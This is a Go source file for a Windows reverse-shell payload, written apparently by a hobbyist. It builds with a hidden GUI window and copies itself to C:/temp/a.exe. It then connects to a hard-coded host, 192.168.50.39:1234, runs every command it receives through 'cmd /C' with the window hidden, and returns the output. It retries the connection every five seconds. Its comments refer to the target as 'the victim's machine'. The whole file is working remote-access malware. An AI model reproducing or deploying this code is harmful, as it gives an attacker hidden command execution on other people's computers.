package main

// Build with go build -ldflags -H=windowsgui payload.go

// Holy that's a lot of packages, I need to figure out how to decrease the amount here
import (
   "bufio"
   "net"
   "os/exec"
   "syscall"
   "time"
   "path/filepath"
   "strings"
   "fmt"
   "log"
   "os"
   "io"
)

// Copy function will attempt to copy the payload into the victim's machine.
// This is the copy function, takes in the source of the payload, and the destination.
func copy(sourcePath, destPath string) error {
    inputFile, err := os.Open(sourcePath)
    if err != nil {
        return fmt.Errorf("Couldn't open source file: %s", err)
    }
    outputFile, err := os.Create(destPath)
    if err != nil {
        inputFile.Close()
        return fmt.Errorf("Couldn't open dest file: %s", err)
    }
    defer outputFile.Close()
    _, err = io.Copy(outputFile, inputFile)
    inputFile.Close()
    if err != nil {
        return fmt.Errorf("Writing to output file failed: %s", err)
    }
    return nil
}

// Networking function that calls back to the host with a "shell"
func reverse(host string) {
   c, err := net.Dial("tcp", host)
   if nil != err {
      if nil != c {
         c.Close()
      }
      // Sleep 5 seconds if it can't call back to host, recall afterwards.
      time.Sleep(5 * time.Second)
      reverse(host)
   }

   r := bufio.NewReader(c)
   for {
      order, err := r.ReadString('\n')
      if nil != err {
         c.Close()
         reverse(host)
         return
      }

      // This took way to long to figure out, DOS commands are now working, but are not persistent.
      cmd := exec.Command("cmd", "/C", order)
      // Not sure if this does anything, check first comment about compiling.
      cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
      out, _ := cmd.CombinedOutput()

      c.Write(out)
   }
}

func checkPayloadInVictim() bool{
  dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
  if nil != err {
          log.Fatal(err)
  }
  if strings.Contains(dir, "C:"){
    fmt.Println("Currently in C drive")
    return true
  } else{
    fmt.Println("Currently not in C drive")
    return false
  }
}

func main() {
  if !checkPayloadInVictim(){
  	err := copy("windows_reverse_shell.exe", "C:/temp/a.exe")
  	if err != nil {
  		log.Fatal(err)
  	} else {
      exec.Command("C:/temp/a.exe")
    }
  } else {
    reverse("192.168.50.39:1234")
  }
}
